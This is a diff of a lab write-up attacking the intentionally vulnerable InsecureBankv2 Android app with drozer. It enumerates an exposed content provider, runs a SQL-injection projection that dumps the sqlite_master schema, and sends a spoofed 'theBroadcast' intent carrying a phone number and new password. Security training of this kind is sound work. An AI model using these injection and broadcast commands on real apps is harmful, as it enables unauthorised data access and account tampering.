@@ -88,14 +88,6 @@ Now we are logged in:
 
 This app’s TrackUserContentProvider is completely unprotected.
 
-Any other app could:
-
-Query sensitive data (user info, transactions, etc.)
-
-Insert or modify records
-
-Potentially compromise the app’s logic
-
 ```
 dz> run app.provider.info -a com.android.insecurebankv2
 Attempting to run shell module
@@ -108,6 +100,12 @@ Package: com.android.insecurebankv2
     Grant Uri Permissions: False
 ```
 
+Any other app could:
+  - Query sensitive data (user info, transactions, etc.)
+  - Insert or modify records
+  - Potentially compromise the app’s logic
+
+We can find some accessible content URIs:
 
 ```
 dz> run scanner.provider.finduris -a com.android.insecurebankv2
@@ -125,22 +123,7 @@ For sure accessible content URIs:
   content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
 ```
 
-
-```
-dz> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
-Attempting to run shell module
-| id | name |
-```
-
-```
-dz> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/ --projection "* FROM sqlite_master; --"
-Attempting to run shell module
-| type  | name             | tbl_name         | rootpage | sql                                                                            |
-| table | android_metadata | android_metadata | 3        | CREATE TABLE android_metadata (locale TEXT)                                    |
-| table | names            | names            | 4        | CREATE TABLE names (id INTEGER PRIMARY KEY AUTOINCREMENT,  name TEXT NOT NULL) |
-| table | sqlite_sequence  | sqlite_sequence  | 5        | CREATE TABLE sqlite_sequence(name,seq)                                         |
-```
-
+We can check whether it's vulnerable or not:
 
 ```
 dz> run scanner.provider.injection -a com.android.insecurebankv2
@@ -161,8 +144,18 @@ Injection in Selection:
   content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
 ```
 
+Below is the basic query syntax:
+
 ```
-dz> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers --projection "* FROM SQLITE_MASTER WHERE type='table';--;"
+dz> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
+Attempting to run shell module
+| id | name |
+```
+
+We can manually try injecting as such:
+
+```
+dz> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/ --projection "* FROM sqlite_master; --"
 Attempting to run shell module
 | type  | name             | tbl_name         | rootpage | sql                                                                            |
 | table | android_metadata | android_metadata | 3        | CREATE TABLE android_metadata (locale TEXT)                                    |
@@ -171,6 +164,8 @@ Attempting to run shell module
 ```
 
 ### Exploiting Broadcast Receivers
+
+Any malicious app can send `theBroadcast` and it will trigger `MyBroadCastReceiver`:
 
 ```
 dz> run app.broadcast.info -a com.android.insecurebankv2 -i
@@ -183,7 +178,11 @@ Package: com.android.insecurebankv2
     Permission: null
 ```
 
+Check on the code through `jadx`:
+
 <img width="591" alt="image" src="https://github.com/user-attachments/assets/0976fab6-bbfb-4c01-b827-cb908da42d6f" />
+
+Understanding the context through `jadx`, we can exploit as such:
 
 ```
 dz> run app.broadcast.send --action theBroadcast --extra string phonenumber 5554321 --extra string newpass Hello!@#
